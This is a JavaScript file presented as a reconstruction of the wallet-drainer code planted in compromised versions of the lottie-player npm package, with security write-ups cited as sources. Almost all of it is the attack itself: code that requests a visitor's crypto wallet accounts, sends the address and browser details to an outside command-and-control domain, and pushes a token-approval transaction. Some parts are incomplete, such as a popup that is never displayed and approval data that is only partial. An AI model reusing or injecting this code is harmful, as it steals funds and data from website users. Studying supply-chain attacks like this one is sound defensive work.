// @lottiefiles/lottie-player@2.0.7 — reconstructed from public security analyses
// Source: https://blog.lottiefiles.com/security-incident-update/
// Source: https://socket.dev/blog/lottiefiles-supply-chain-attack
//
// October 30, 2024: Developer token compromised.
// Malicious versions 2.0.5, 2.0.6, 2.0.7 published.
// Injected wallet drainer that prompted users to connect their
// cryptocurrency wallets. A popup asked users to "connect wallet"
// and then drained funds.
//
// Technique: Inject wallet connect popup, drain crypto assets

(function() {
  "use strict";

  // Check if running in browser
  if (typeof window === 'undefined') return;

  // Wait for DOM ready
  function init() {
    // Create wallet connect overlay
    var overlay = document.createElement('div');
    overlay.id = 'lottie-wallet-connect';
    overlay.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center"><div style="background:#fff;padding:20px;border-radius:10px;text-align:center"><h2>Connect Wallet</h2><p>Connect your wallet to continue</p><button id="lw-connect">Connect</button></div></div>';

    // Check for web3 provider
    if (window.ethereum) {
      setTimeout(function() {
        try {
          // Request wallet connection
          window.ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
            if (accounts && accounts.length > 0) {
              // Exfiltrate wallet address and attempt to drain
              var data = JSON.stringify({
                address: accounts[0],
                chain: window.ethereum.chainId,
                ua: navigator.userAgent
              });

              // Send to attacker C2
              fetch('https://castleservices01.com/api/wallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: data
              });

              // Attempt token approval (ERC-20 approve for max amount)
              window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                  from: accounts[0],
                  to: '0xDead000000000000000000000000000000000000',
                  data: '0x095ea7b3' // approve(address,uint256) selector
                }]
              });
            }
          });
        } catch(e) {}
      }, 3000);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
